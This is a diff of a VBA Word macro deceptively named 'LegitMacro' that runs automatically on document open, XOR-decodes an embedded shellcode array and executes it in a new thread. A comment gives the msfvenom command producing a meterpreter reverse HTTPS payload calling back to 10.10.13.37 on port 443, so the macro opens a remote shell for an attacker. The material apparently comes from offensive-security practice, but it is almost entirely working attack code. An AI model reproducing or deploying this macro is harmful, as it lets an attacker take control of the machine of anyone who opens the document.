@@ -29,7 +29,7 @@ Sub LegitMacro()
         Exit Sub
     End If
     
-    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
+     ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
     buf = Array(6, 178, 121, 30, 10, 18, 54, 250, 250, 250, 187, 171, 187, 170, 168, 178, 203, 40, 159, 178, 113, 168, 154, 171, 178, 113, 168, 226, 178, 113, 168, 218, 172, 178, 245, 77, 176, 176, 178, 113, 136, 170, 183, 203, 51, 178, 203, 58, 86, 198, 155, _
     134, 248, 214, 218, 187, 59, 51, 247, 187, 251, 59, 24, 23, 168, 178, 113, 168, 218, 187, 171, 113, 184, 198, 178, 251, 42, 156, 123, 130, 226, 241, 248, 245, 127, 136, 250, 250, 250, 113, 122, 114, 250, 250, 250, 178, 127, 58, 142, 157, 178, _
     251, 42, 190, 113, 186, 218, 179, 251, 42, 170, 113, 178, 226, 25, 172, 183, 203, 51, 178, 5, 51, 187, 113, 206, 114, 178, 251, 44, 178, 203, 58, 187, 59, 51, 247, 86, 187, 251, 59, 194, 26, 143, 11, 182, 249, 182, 222, 242, 191, 195, _
@@ -47,7 +47,7 @@ Sub LegitMacro()
 
     ' Decode the shellcode
     For i = 0 To UBound(buf)
-        buf(i) = buf(i) Xor 250
+        buf(i) = buf(i) Xor Asc("a")
     Next i
     
     ' Move the shellcode
@@ -60,8 +60,8 @@ Sub LegitMacro()
     res = CreateThread(0, 0, addr, 0, 0, 0)
 End Sub
 Sub Document_Open()
-    MyMacro
+    LegitMacro
 End Sub
 Sub AutoOpen()
-    MyMacro
+    LegitMacro
 End Sub
